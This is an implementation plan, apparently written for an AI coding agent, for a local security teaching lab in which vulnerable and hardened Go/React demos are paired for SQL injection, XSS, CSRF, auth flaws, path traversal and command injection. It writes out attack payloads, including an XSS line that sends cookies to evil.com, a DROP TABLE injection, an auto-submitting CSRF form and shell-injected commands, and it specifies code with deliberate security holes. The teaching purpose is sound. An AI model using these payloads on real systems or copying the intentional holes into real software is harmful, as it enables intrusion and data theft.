# 03_security_measures 実装計画

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** OWASP Top 10の主要攻撃手法について、脆弱版と対策版のデモアプリを構築し、攻撃の再現と対策を学べる環境を提供する。

**Architecture:** 攻撃手法ごとに独立したGoバックエンド + Reactフロントエンドを `vulnerable/` と `secure/` に分離。Docker Composeのプロファイル機能で個別起動可能。

**Tech Stack:** Go (net/http, SQLite), React (Vite), Docker Compose, SQLite

---

## Task 1: プロジェクト基盤の構築

**Files:**
- Create: `03_security_measures/README.md`
- Create: `03_security_measures/Makefile`
- Create: `03_security_measures/docker-compose.yml`
- Create: `03_security_measures/.gitignore`
- Create: `03_security_measures/docs/overview.md`

**Step 1: README.md を作成**

```markdown
# 03_security_measures: Webアプリケーションセキュリティ学習

OWASP Top 10を中心としたWebセキュリティの学習環境。
各攻撃手法について「脆弱なコード」と「対策済みコード」を用意し、実際に攻撃を再現しながら学べる。

## 対象攻撃手法

| 攻撃手法 | ディレクトリ | Backend (vuln/sec) | Frontend (vuln/sec) |
|---|---|---|---|
| SQLインジェクション | `sql-injection/` | 8080 / 8081 | 3000 / 3001 |
| XSS | `xss/` | 8082 / 8083 | 3002 / 3003 |
| CSRF | `csrf/` | 8084 / 8085 | 3004 / 3005 |
| 認証の不備 | `auth-bypass/` | 8086 / 8087 | 3006 / 3007 |
| パストラバーサル | `path-traversal/` | 8088 / 8089 | 3008 / 3009 |
| コマンドインジェクション | `command-injection/` | 8090 / 8091 | 3010 / 3011 |

## 前提条件

- Docker / Docker Compose
- (ローカル実行の場合) Go 1.22+, Node.js 20+

## 使い方

### 個別起動

```bash
# SQLインジェクションのデモのみ起動
make sql-injection

# XSSのデモのみ起動
make xss
```

### 全デモ起動

```bash
make all
```

### 停止

```bash
make down
```
```

**Step 2: Makefile を作成**

```makefile
.PHONY: all down help sql-injection xss csrf auth-bypass path-traversal command-injection

help: ## ヘルプ表示
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | awk 'BEGIN {FS = ":.*?## "}; {printf "\033[36m%-20s\033[0m %s\n", $$1, $$2}'

sql-injection: ## SQLインジェクションデモ起動
	docker compose --profile sql-injection up --build -d

xss: ## XSSデモ起動
	docker compose --profile xss up --build -d

csrf: ## CSRFデモ起動
	docker compose --profile csrf up --build -d

auth-bypass: ## 認証の不備デモ起動
	docker compose --profile auth-bypass up --build -d

path-traversal: ## パストラバーサルデモ起動
	docker compose --profile path-traversal up --build -d

command-injection: ## コマンドインジェクションデモ起動
	docker compose --profile command-injection up --build -d

all: ## 全デモ起動
	docker compose --profile sql-injection --profile xss --profile csrf --profile auth-bypass --profile path-traversal --profile command-injection up --build -d

down: ## 全サービス停止
	docker compose --profile sql-injection --profile xss --profile csrf --profile auth-bypass --profile path-traversal --profile command-injection down
```

**Step 3: docker-compose.yml の雛形を作成**

最初は空のservicesで作成。各Taskで攻撃手法ごとにサービスを追加していく。

```yaml
services: {}
```

**Step 4: .gitignore を作成**

```
node_modules/
dist/
*.db
*.sqlite
```

**Step 5: docs/overview.md を作成**

セキュリティ全体の概要ドキュメント。OWASP Top 10の説明、本プロジェクトの目的、各攻撃手法の関係性を記述。

**Step 6: コミット**

```bash
git add 03_security_measures/
git commit -m "add 03_security_measures project scaffolding"
```

---

## Task 2: SQLインジェクション — 脆弱版バックエンド

**Files:**
- Create: `03_security_measures/sql-injection/vulnerable/backend/main.go`
- Create: `03_security_measures/sql-injection/vulnerable/backend/go.mod`
- Create: `03_security_measures/sql-injection/vulnerable/backend/main_test.go`
- Create: `03_security_measures/sql-injection/vulnerable/backend/Dockerfile`

**Step 1: テストを書く**

`main_test.go` — 脆弱なエンドポイントが SQLインジェクションに対して脆弱であることを検証するテスト:
- 正常検索: `GET /users?name=Alice` → Aliceのみ返る
- SQLi攻撃: `GET /users?name=' OR '1'='1` → 全ユーザー返る（脆弱性の証明）

**Step 2: テスト実行 → FAIL確認**

```bash
cd 03_security_measures/sql-injection/vulnerable/backend
go test -v ./...
```

**Step 3: 実装**

`main.go`:
- SQLiteに `users` テーブル作成（id, name, email, password）
- 初期データ投入（Alice, Bob, Charlie）
- `GET /users?name=xxx` — 文字列結合で `SELECT * FROM users WHERE name = '` + name + `'` を構築（意図的に脆弱）
- `GET /users` — 全ユーザー一覧
- CORSヘッダー設定
- ポート: 8080

`go.mod`:
- module: `security-measures/sql-injection/vulnerable`
- `github.com/mattn/go-sqlite3` を依存に追加

**Step 4: テスト実行 → PASS確認**

```bash
go test -v ./...
```

**Step 5: Dockerfile作成**

```dockerfile
FROM golang:1.22-alpine AS builder
RUN apk add --no-cache gcc musl-dev
WORKDIR /app
COPY go.mod go.sum ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=1 go build -o server .

FROM alpine:latest
RUN apk add --no-cache libc6-compat
WORKDIR /app
COPY --from=builder /app/server .
EXPOSE 8080
CMD ["./server"]
```

**Step 6: docker-compose.yml にサービス追加**

```yaml
sqli-vulnerable-backend:
  build: ./sql-injection/vulnerable/backend
  ports:
    - "8080:8080"
  profiles:
    - sql-injection
```

**Step 7: コミット**

```bash
git add 03_security_measures/sql-injection/vulnerable/backend/ 03_security_measures/docker-compose.yml
git commit -m "add sql-injection vulnerable backend"
```

---

## Task 3: SQLインジェクション — 対策版バックエンド

**Files:**
- Create: `03_security_measures/sql-injection/secure/backend/main.go`
- Create: `03_security_measures/sql-injection/secure/backend/go.mod`
- Create: `03_security_measures/sql-injection/secure/backend/main_test.go`
- Create: `03_security_measures/sql-injection/secure/backend/Dockerfile`

**Step 1: テストを書く**

`main_test.go` — 対策版がSQLインジェクションを防ぐことを検証:
- 正常検索: `GET /users?name=Alice` → Aliceのみ返る
- SQLi攻撃: `GET /users?name=' OR '1'='1` → 結果0件（対策済みの証明）

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

`main.go`:
- Task 2と同じ構造だが、`db.Query("SELECT * FROM users WHERE name = ?", name)` でプリペアドステートメント使用
- ポート: 8080（コンテナ内は同じ、ホストポートは8081にマッピング）

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile作成（Task 2と同じ構造）**

**Step 6: docker-compose.yml にサービス追加**

```yaml
sqli-secure-backend:
  build: ./sql-injection/secure/backend
  ports:
    - "8081:8080"
  profiles:
    - sql-injection
```

**Step 7: コミット**

```bash
git commit -m "add sql-injection secure backend"
```

---

## Task 4: SQLインジェクション — フロントエンド（脆弱版 + 対策版）

**Files:**
- Create: `03_security_measures/sql-injection/vulnerable/frontend/` (Vite React プロジェクト)
- Create: `03_security_measures/sql-injection/secure/frontend/` (Vite React プロジェクト)
- Create: 各 `Dockerfile`

**Step 1: 脆弱版フロントエンド作成**

React + Viteプロジェクト。以下のUI:
- ユーザー検索フォーム（テキスト入力 + 検索ボタン）
- 検索結果テーブル（name, email 表示）
- APIエンドポイントは環境変数 `VITE_API_URL` で設定（デフォルト `http://localhost:8080`）
- 攻撃用のペイロード例をUI上に表示（`' OR '1'='1` など）

**Step 2: 対策版フロントエンド作成**

脆弱版と同じUIだが、API先が対策版バックエンド（`http://localhost:8081`）。
同じ攻撃ペイロードを試しても結果が異なることを確認できる。

**Step 3: 各 Dockerfile 作成**

```dockerfile
FROM node:20-alpine AS builder
WORKDIR /app
COPY package.json pnpm-lock.yaml ./
RUN corepack enable && pnpm install --frozen-lockfile
COPY . .
RUN pnpm build

FROM nginx:alpine
COPY --from=builder /app/dist /usr/share/nginx/html
COPY nginx.conf /etc/nginx/conf.d/default.conf
EXPOSE 80
```

**Step 4: docker-compose.yml にフロントエンドサービス追加**

```yaml
sqli-vulnerable-frontend:
  build: ./sql-injection/vulnerable/frontend
  ports:
    - "3000:80"
  profiles:
    - sql-injection

sqli-secure-frontend:
  build: ./sql-injection/secure/frontend
  ports:
    - "3001:80"
  profiles:
    - sql-injection
```

**Step 5: 動作確認**

```bash
make sql-injection
# ブラウザで http://localhost:3000 (脆弱版) と http://localhost:3001 (対策版) を開く
# 検索フォームに ' OR '1'='1 を入力して結果を比較
make down
```

**Step 6: コミット**

```bash
git commit -m "add sql-injection frontend (vulnerable + secure)"
```

---

## Task 5: SQLインジェクション — ドキュメント

**Files:**
- Create: `03_security_measures/docs/sql-injection.md`

**Step 1: ドキュメント作成**

以下の構成で記述:
1. **概要** — SQLインジェクションとは何か、なぜ危険か
2. **攻撃の仕組み** — 文字列結合によるSQL構築の危険性を図解
3. **デモ環境の起動手順** — `make sql-injection` の手順
4. **攻撃手順** — ステップバイステップで以下を試す:
   - `' OR '1'='1` で全ユーザー取得
   - `' UNION SELECT 1, sql, 3, 4 FROM sqlite_master--` でテーブル構造取得
   - `'; DROP TABLE users;--` でテーブル削除
5. **脆弱なコードの解説** — `vulnerable/backend/main.go` のコード参照
6. **対策コードの解説** — `secure/backend/main.go` のコード参照、プリペアドステートメントの仕組み
7. **まとめ** — ベストプラクティスチェックリスト

**Step 2: コミット**

```bash
git commit -m "add sql-injection documentation"
```

---

## Task 6: XSS — 脆弱版バックエンド

**Files:**
- Create: `03_security_measures/xss/vulnerable/backend/main.go`
- Create: `03_security_measures/xss/vulnerable/backend/go.mod`
- Create: `03_security_measures/xss/vulnerable/backend/main_test.go`
- Create: `03_security_measures/xss/vulnerable/backend/Dockerfile`

**Step 1: テストを書く**

- 投稿API: `POST /posts` — body `{"content": "<script>alert(1)</script>"}` → 200 OK
- 取得API: `GET /posts` → レスポンスに `<script>alert(1)</script>` がそのまま含まれる（脆弱性の証明）

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

`main.go`:
- インメモリで投稿を保存（スライス）
- `POST /posts` — JSONボディの `content` をそのまま保存
- `GET /posts` — 全投稿をJSONで返す（エスケープなし）
- CORSヘッダー設定
- ポート: 8080

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile作成 + docker-compose.yml 更新**

```yaml
xss-vulnerable-backend:
  build: ./xss/vulnerable/backend
  ports:
    - "8082:8080"
  profiles:
    - xss
```

**Step 6: コミット**

```bash
git commit -m "add xss vulnerable backend"
```

---

## Task 7: XSS — 対策版バックエンド

**Files:**
- Create: `03_security_measures/xss/secure/backend/main.go`
- Create: `03_security_measures/xss/secure/backend/go.mod`
- Create: `03_security_measures/xss/secure/backend/main_test.go`
- Create: `03_security_measures/xss/secure/backend/Dockerfile`

**Step 1: テストを書く**

- 投稿API: `POST /posts` → 200 OK
- 取得API: `GET /posts` → `<script>` が `&lt;script&gt;` にエスケープされている
- Content-Security-Policy ヘッダーが設定されている

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

`main.go`:
- `html.EscapeString()` でサニタイズしてから保存
- `Content-Security-Policy: default-src 'self'` ヘッダーを追加
- `X-Content-Type-Options: nosniff` ヘッダーを追加

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile + docker-compose.yml 更新**

```yaml
xss-secure-backend:
  build: ./xss/secure/backend
  ports:
    - "8083:8080"
  profiles:
    - xss
```

**Step 6: コミット**

```bash
git commit -m "add xss secure backend"
```

---

## Task 8: XSS — フロントエンド（脆弱版 + 対策版）

**Files:**
- Create: `03_security_measures/xss/vulnerable/frontend/` (Vite React)
- Create: `03_security_measures/xss/secure/frontend/` (Vite React)

**Step 1: 脆弱版フロントエンド作成**

- 投稿フォーム（テキストエリア + 投稿ボタン）
- 投稿一覧表示 — `dangerouslySetInnerHTML` で描画（意図的に脆弱）
- 攻撃ペイロード例をUI上に表示

**Step 2: 対策版フロントエンド作成**

- 同じUI構造だが、投稿一覧をテキストノードとして描画（`dangerouslySetInnerHTML` 不使用）
- バックエンドのエスケープと組み合わせて二重防御

**Step 3: Dockerfile + docker-compose.yml 更新**

```yaml
xss-vulnerable-frontend:
  build: ./xss/vulnerable/frontend
  ports:
    - "3002:80"
  profiles:
    - xss

xss-secure-frontend:
  build: ./xss/secure/frontend
  ports:
    - "3003:80"
  profiles:
    - xss
```

**Step 4: 動作確認 → コミット**

```bash
git commit -m "add xss frontend (vulnerable + secure)"
```

---

## Task 9: XSS — ドキュメント

**Files:**
- Create: `03_security_measures/docs/xss.md`

**内容:**
1. 概要 — Stored XSS / Reflected XSS / DOM-based XSS の違い
2. 攻撃の仕組み — スクリプト注入の流れ
3. デモ環境の起動手順
4. 攻撃手順 — `<script>alert('XSS')</script>`, `<img onerror="fetch('http://evil.com?c='+document.cookie)" src="x">` 等
5. 脆弱なコード解説（バックエンド + フロントエンド両方）
6. 対策コード解説（エスケープ、CSP、dangerouslySetInnerHTML 回避）
7. まとめ

**コミット:**

```bash
git commit -m "add xss documentation"
```

---

## Task 10: CSRF — 脆弱版バックエンド

**Files:**
- Create: `03_security_measures/csrf/vulnerable/backend/main.go`
- Create: `03_security_measures/csrf/vulnerable/backend/go.mod`
- Create: `03_security_measures/csrf/vulnerable/backend/main_test.go`
- Create: `03_security_measures/csrf/vulnerable/backend/Dockerfile`

**Step 1: テストを書く**

- `POST /login` → セッションCookie発行
- `POST /change-password` — Cookie付きリクエストでパスワード変更成功
- CSRFトークンなしで別オリジンからのリクエストが通る（脆弱性の証明）

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

`main.go`:
- セッション管理（Cookieベース、インメモリストア）
- `POST /login` — ユーザー認証、セッションCookie設定（SameSite未設定）
- `POST /change-password` — セッション認証のみでパスワード変更（CSRFトークンなし）
- `GET /me` — 現在のユーザー情報

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile + docker-compose.yml 更新**

```yaml
csrf-vulnerable-backend:
  build: ./csrf/vulnerable/backend
  ports:
    - "8084:8080"
  profiles:
    - csrf
```

**Step 6: コミット**

```bash
git commit -m "add csrf vulnerable backend"
```

---

## Task 11: CSRF — 対策版バックエンド

**Files:**
- Create: `03_security_measures/csrf/secure/backend/main.go`
- Create: `03_security_measures/csrf/secure/backend/go.mod`
- Create: `03_security_measures/csrf/secure/backend/main_test.go`
- Create: `03_security_measures/csrf/secure/backend/Dockerfile`

**Step 1: テストを書く**

- CSRFトークンなしの `POST /change-password` → 403 Forbidden
- 正しいCSRFトークン付き → 200 OK

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

- `GET /csrf-token` — CSRFトークン生成・レスポンス
- `POST /change-password` — CSRFトークン検証（ヘッダー `X-CSRF-Token`）
- Cookie: `SameSite=Strict`, `HttpOnly=true`

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile + docker-compose.yml 更新**

```yaml
csrf-secure-backend:
  build: ./csrf/secure/backend
  ports:
    - "8085:8080"
  profiles:
    - csrf
```

**Step 6: コミット**

```bash
git commit -m "add csrf secure backend"
```

---

## Task 12: CSRF — フロントエンド（脆弱版 + 対策版 + 攻撃者サイト）

**Files:**
- Create: `03_security_measures/csrf/vulnerable/frontend/` (Vite React)
- Create: `03_security_measures/csrf/secure/frontend/` (Vite React)
- Create: `03_security_measures/csrf/attacker-site/index.html` (静的HTML)

**Step 1: 脆弱版フロントエンド**

- ログインフォーム + パスワード変更フォーム

**Step 2: 攻撃者サイト作成**

罠ページ:
```html
<!-- 自動でPOSTを送信するHTML -->
<form action="http://localhost:8084/change-password" method="POST" id="exploit">
  <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.getElementById('exploit').submit();</script>
```

**Step 3: 対策版フロントエンド**

- ログインフォーム + パスワード変更フォーム
- CSRFトークンを取得してリクエストヘッダーに付与

**Step 4: docker-compose.yml 更新 + 攻撃者サイト用サービス追加**

```yaml
csrf-vulnerable-frontend:
  build: ./csrf/vulnerable/frontend
  ports:
    - "3004:80"
  profiles:
    - csrf

csrf-secure-frontend:
  build: ./csrf/secure/frontend
  ports:
    - "3005:80"
  profiles:
    - csrf

csrf-attacker-site:
  image: nginx:alpine
  volumes:
    - ./csrf/attacker-site:/usr/share/nginx/html:ro
  ports:
    - "4000:80"
  profiles:
    - csrf
```

**Step 5: 動作確認 → コミット**

```bash
git commit -m "add csrf frontend (vulnerable + secure + attacker site)"
```

---

## Task 13: CSRF — ドキュメント

**Files:**
- Create: `03_security_measures/docs/csrf.md`

**内容:**
1. 概要 — CSRFの仕組み
2. 攻撃の仕組み — 別オリジンからのリクエスト偽造フロー図
3. 攻撃手順 — 脆弱版にログイン → 攻撃者サイト（localhost:4000）にアクセス → パスワードが変更される
4. 対策コード解説 — CSRFトークン、SameSite Cookie、Origin検証
5. まとめ

**コミット:**

```bash
git commit -m "add csrf documentation"
```

---

## Task 14: 認証の不備 — 脆弱版バックエンド

**Files:**
- Create: `03_security_measures/auth-bypass/vulnerable/backend/main.go`
- Create: `03_security_measures/auth-bypass/vulnerable/backend/go.mod`
- Create: `03_security_measures/auth-bypass/vulnerable/backend/main_test.go`
- Create: `03_security_measures/auth-bypass/vulnerable/backend/Dockerfile`

**Step 1: テストを書く**

- ブルートフォース: 連続100回のログイン失敗 → レート制限されない（脆弱性）
- 平文パスワード: DBにパスワードがそのまま保存されている
- セッション固定: ログイン前後でセッションIDが変わらない

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

`main.go`:
- SQLite にユーザーテーブル（平文パスワード保存）
- `POST /login` — パスワード平文比較、レート制限なし
- `GET /admin` — セッション認証のみ
- セッションID: ログイン前に設定されたCookieをそのまま使い続ける（固定）

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile + docker-compose.yml 更新**

```yaml
auth-vulnerable-backend:
  build: ./auth-bypass/vulnerable/backend
  ports:
    - "8086:8080"
  profiles:
    - auth-bypass
```

**Step 6: コミット**

```bash
git commit -m "add auth-bypass vulnerable backend"
```

---

## Task 15: 認証の不備 — 対策版バックエンド

**Files:**
- Create: `03_security_measures/auth-bypass/secure/backend/main.go`
- Create: `03_security_measures/auth-bypass/secure/backend/go.mod`
- Create: `03_security_measures/auth-bypass/secure/backend/main_test.go`
- Create: `03_security_measures/auth-bypass/secure/backend/Dockerfile`

**Step 1: テストを書く**

- ブルートフォース: 5回失敗後 → 429 Too Many Requests
- bcrypt: DBにハッシュされたパスワードが保存されている
- セッション再生成: ログイン前後でセッションIDが変わる

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

- `golang.org/x/crypto/bcrypt` でパスワードハッシュ
- IPベースのレート制限（5回/分）
- ログイン成功時にセッションIDを再生成

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile + docker-compose.yml 更新**

```yaml
auth-secure-backend:
  build: ./auth-bypass/secure/backend
  ports:
    - "8087:8080"
  profiles:
    - auth-bypass
```

**Step 6: コミット**

```bash
git commit -m "add auth-bypass secure backend"
```

---

## Task 16: 認証の不備 — フロントエンド（脆弱版 + 対策版）

**Files:**
- Create: `03_security_measures/auth-bypass/vulnerable/frontend/` (Vite React)
- Create: `03_security_measures/auth-bypass/secure/frontend/` (Vite React)

**Step 1: 脆弱版フロントエンド**

- ログインフォーム + 管理画面
- ブルートフォース攻撃デモボタン（連続ログイン試行）

**Step 2: 対策版フロントエンド**

- 同じUI + レート制限の表示（残り試行回数）

**Step 3: Dockerfile + docker-compose.yml 更新**

```yaml
auth-vulnerable-frontend:
  build: ./auth-bypass/vulnerable/frontend
  ports:
    - "3006:80"
  profiles:
    - auth-bypass

auth-secure-frontend:
  build: ./auth-bypass/secure/frontend
  ports:
    - "3007:80"
  profiles:
    - auth-bypass
```

**Step 4: 動作確認 → コミット**

```bash
git commit -m "add auth-bypass frontend (vulnerable + secure)"
```

---

## Task 17: 認証の不備 — ドキュメント

**Files:**
- Create: `03_security_measures/docs/auth-bypass.md`

**内容:**
1. 概要 — 認証に関する一般的な脆弱性
2. 攻撃手順 — ブルートフォース、セッション固定の再現手順
3. 脆弱コード vs 対策コード
4. まとめ — bcrypt, レート制限, セッション管理のベストプラクティス

**コミット:**

```bash
git commit -m "add auth-bypass documentation"
```

---

## Task 18: パストラバーサル — 脆弱版バックエンド

**Files:**
- Create: `03_security_measures/path-traversal/vulnerable/backend/main.go`
- Create: `03_security_measures/path-traversal/vulnerable/backend/go.mod`
- Create: `03_security_measures/path-traversal/vulnerable/backend/main_test.go`
- Create: `03_security_measures/path-traversal/vulnerable/backend/Dockerfile`
- Create: `03_security_measures/path-traversal/vulnerable/backend/files/` (サンプルファイル)

**Step 1: テストを書く**

- 正常: `GET /download?file=readme.txt` → ファイル内容返却
- 攻撃: `GET /download?file=../../etc/passwd` → `/etc/passwd` の内容が返る（脆弱性）

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

`main.go`:
- `GET /files` — `files/` ディレクトリのファイル一覧
- `GET /download?file=xxx` — `files/` + ユーザー入力のパスでファイル読み込み（パス検証なし）
- サンプルファイル: `files/readme.txt`, `files/report.csv`

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile + docker-compose.yml 更新**

```yaml
path-vulnerable-backend:
  build: ./path-traversal/vulnerable/backend
  ports:
    - "8088:8080"
  profiles:
    - path-traversal
```

**Step 6: コミット**

```bash
git commit -m "add path-traversal vulnerable backend"
```

---

## Task 19: パストラバーサル — 対策版バックエンド

**Files:**
- Create: `03_security_measures/path-traversal/secure/backend/main.go`
- Create: `03_security_measures/path-traversal/secure/backend/go.mod`
- Create: `03_security_measures/path-traversal/secure/backend/main_test.go`
- Create: `03_security_measures/path-traversal/secure/backend/Dockerfile`
- Create: `03_security_measures/path-traversal/secure/backend/files/` (サンプルファイル)

**Step 1: テストを書く**

- 正常: `GET /download?file=readme.txt` → 200
- 攻撃: `GET /download?file=../../etc/passwd` → 400 Bad Request

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

- `filepath.Clean()` でパスを正規化
- 解決後のパスがベースディレクトリ内か `strings.HasPrefix` で検証
- `filepath.Base()` でファイル名のみ抽出（ディレクトリトラバーサル防止）

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile + docker-compose.yml 更新**

```yaml
path-secure-backend:
  build: ./path-traversal/secure/backend
  ports:
    - "8089:8080"
  profiles:
    - path-traversal
```

**Step 6: コミット**

```bash
git commit -m "add path-traversal secure backend"
```

---

## Task 20: パストラバーサル — フロントエンド + ドキュメント

**Files:**
- Create: `03_security_measures/path-traversal/vulnerable/frontend/` (Vite React)
- Create: `03_security_measures/path-traversal/secure/frontend/` (Vite React)
- Create: `03_security_measures/docs/path-traversal.md`

**Step 1: フロントエンド作成**

- ファイル一覧表示 + ダウンロードリンク
- 手動パス入力フィールド（攻撃テスト用）

**Step 2: docker-compose.yml 更新**

```yaml
path-vulnerable-frontend:
  build: ./path-traversal/vulnerable/frontend
  ports:
    - "3008:80"
  profiles:
    - path-traversal

path-secure-frontend:
  build: ./path-traversal/secure/frontend
  ports:
    - "3009:80"
  profiles:
    - path-traversal
```

**Step 3: ドキュメント作成**

**Step 4: コミット**

```bash
git commit -m "add path-traversal frontend and documentation"
```

---

## Task 21: コマンドインジェクション — 脆弱版バックエンド

**Files:**
- Create: `03_security_measures/command-injection/vulnerable/backend/main.go`
- Create: `03_security_measures/command-injection/vulnerable/backend/go.mod`
- Create: `03_security_measures/command-injection/vulnerable/backend/main_test.go`
- Create: `03_security_measures/command-injection/vulnerable/backend/Dockerfile`

**Step 1: テストを書く**

- 正常: `POST /lookup` body `{"host": "example.com"}` → nslookup結果
- 攻撃: `POST /lookup` body `{"host": "example.com; echo HACKED"}` → 出力に "HACKED" が含まれる（脆弱性）

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

`main.go`:
- `POST /lookup` — `exec.Command("sh", "-c", "nslookup " + host)` で実行（意図的に脆弱）
- `POST /ping` — `exec.Command("sh", "-c", "ping -c 1 " + host)` で実行

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile + docker-compose.yml 更新**

```yaml
cmdi-vulnerable-backend:
  build: ./command-injection/vulnerable/backend
  ports:
    - "8090:8080"
  profiles:
    - command-injection
```

**Step 6: コミット**

```bash
git commit -m "add command-injection vulnerable backend"
```

---

## Task 22: コマンドインジェクション — 対策版バックエンド

**Files:**
- Create: `03_security_measures/command-injection/secure/backend/main.go`
- Create: `03_security_measures/command-injection/secure/backend/go.mod`
- Create: `03_security_measures/command-injection/secure/backend/main_test.go`
- Create: `03_security_measures/command-injection/secure/backend/Dockerfile`

**Step 1: テストを書く**

- 正常: `POST /lookup` → 正常結果
- 攻撃: `POST /lookup` body `{"host": "example.com; echo HACKED"}` → 400 Bad Request（入力バリデーション）

**Step 2: テスト実行 → FAIL確認**

**Step 3: 実装**

- `exec.Command("nslookup", host)` で引数を分離（シェル経由しない）
- 入力バリデーション: 正規表現 `^[a-zA-Z0-9.-]+$` でホスト名のみ許可
- allowlist方式のバリデーション

**Step 4: テスト実行 → PASS確認**

**Step 5: Dockerfile + docker-compose.yml 更新**

```yaml
cmdi-secure-backend:
  build: ./command-injection/secure/backend
  ports:
    - "8091:8080"
  profiles:
    - command-injection
```

**Step 6: コミット**

```bash
git commit -m "add command-injection secure backend"
```

---

## Task 23: コマンドインジェクション — フロントエンド + ドキュメント

**Files:**
- Create: `03_security_measures/command-injection/vulnerable/frontend/` (Vite React)
- Create: `03_security_measures/command-injection/secure/frontend/` (Vite React)
- Create: `03_security_measures/docs/command-injection.md`

**Step 1: フロントエンド作成**

- ホスト名入力フォーム（DNS Lookup / Ping 切り替え）
- 実行結果のターミナル風表示
- 攻撃ペイロード例をUI上に表示

**Step 2: docker-compose.yml 更新**

```yaml
cmdi-vulnerable-frontend:
  build: ./command-injection/vulnerable/frontend
  ports:
    - "3010:80"
  profiles:
    - command-injection

cmdi-secure-frontend:
  build: ./command-injection/secure/frontend
  ports:
    - "3011:80"
  profiles:
    - command-injection
```

**Step 3: ドキュメント作成**

**Step 4: コミット**

```bash
git commit -m "add command-injection frontend and documentation"
```

---

## Task 24: 最終統合・動作確認

**Step 1: 全プロファイルの動作確認**

```bash
cd 03_security_measures
make sql-injection  # 起動 → 動作確認 → make down
make xss
make csrf
make auth-bypass
make path-traversal
make command-injection
make all            # 全起動 → 確認 → make down
```

**Step 2: README.md の最終更新**

全デモの動作確認結果を反映。

**Step 3: コミット**

```bash
git commit -m "finalize 03_security_measures integration"
```
